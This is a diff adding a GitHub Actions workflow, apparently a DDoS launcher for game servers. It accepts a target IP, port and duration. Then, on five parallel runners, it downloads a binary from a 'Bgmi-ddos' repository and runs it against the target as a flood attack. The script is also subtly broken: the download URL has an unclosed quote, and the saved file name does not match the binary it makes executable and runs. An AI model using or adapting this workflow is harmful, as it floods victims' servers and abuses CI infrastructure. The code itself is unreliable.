@@ -1,0 +1,43 @@
+name: 🗿 IZANA KING
+on: 
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: '🎯 Target IP Address'
+        required: true
+        type: string
+      target_port: 
+        description: '🔌 Target Port'
+        required: true
+        type: string
+      attack_duration:
+        description: '⏰ Attack Duration (seconds)'
+        required: true
+        type: string
+
+permissions:
+  contents: write
+
+jobs:
+  fire:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5]
+    steps:
+      - name: 🚀 IZANA Binary Download
+        run: |
+          wget -q "https://raw.githubusercontent.com/IGIxPiKaChu/Bgmi-ddos/main/SAM -O SAM
+          chmod +x bgmi
+          echo "✅ bgmi Binary Ready"
+          
+      - name: 💥 IZANA Attack Execute
+        timeout-minutes: 10
+        continue-on-error: true
+        run: |
+          echo "🎯 Target: ${{ inputs.target_ip }}:${{ inputs.target_port }}"
+          echo "⏰ Duration: ${{ inputs.attack_duration }} seconds"
+          echo "🔢 Instance: ${{ matrix.instance }}"
+          echo "🔥 Executing: ./bgmi ${{ inputs.target_ip }} ${{ inputs.target_port }} ${{ inputs.attack_duration }} 999"
+          ./bgmi "${{ inputs.target_ip }}" "${{ inputs.target_port }}" "${{ inputs.attack_duration }}" 999
+          echo "✅ IZANA Attack Complete"
